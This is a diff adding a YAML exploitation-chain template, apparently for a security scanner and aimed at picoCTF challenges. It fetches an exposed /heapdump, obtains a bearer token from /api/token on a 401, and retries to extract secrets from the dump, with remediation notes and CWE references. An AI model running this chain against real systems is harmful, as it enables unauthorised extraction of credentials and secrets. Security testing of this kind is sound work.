@@ -1,0 +1,64 @@
+id: chain-example
+
+info:
+  name: Heapdump Auth-Aware Chain (try -> 401 -> token -> retry)
+  severity: Critical
+  confidence: high
+  category: Exploitation Chain
+  description: Multi-step chain that first attempts heapdump access, then obtains auth token from API, then retries with authentication to extract secrets from heap dump.
+  remediation: Require strong auth, disable debug endpoints in production, and restrict network exposure.
+  references:
+    - "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"
+    - "https://cwe.mitre.org/data/definitions/552.html"
+  cwe: "552"
+  owasp: "A06:2021-Security Misconfiguration"
+  tags: [chain, auth, token, heapdump, debug]
+  preconditions:
+    - Heapdump endpoint accessible (no auth or weak auth)
+  evidence_type: http-exchange
+  exploitability: critical
+
+steps:
+  - id: try_dump
+    request:
+      method: GET
+      path: /heapdump
+    expect:
+      status: [200, 401]
+    match:
+      status: 200
+      header_contains:
+        - application/octet-stream
+      body_regex:
+        - picoCTF\{[^}]+\}
+
+  - id: get_token
+    when:
+      previous_status: 401
+    request:
+      method: GET
+      path: /api/token
+    expect:
+      status: [200, 204]
+    extract:
+      token: 'body_regex:\s*"token"\s*:\s*"([^"]+)"'
+
+  - id: retry_dump
+    when:
+      previous_status: 401
+    request:
+      method: GET
+      path: /heapdump
+      headers:
+        Authorization: "Bearer {{token}}"
+    expect:
+      status: 200
+    match:
+      status: 200
+      header_contains:
+        - application/octet-stream
+      body_regex:
+        - picoCTF\{[^}]+\}
+
+save_artifact: true
+artifact_name: heapdump_chain
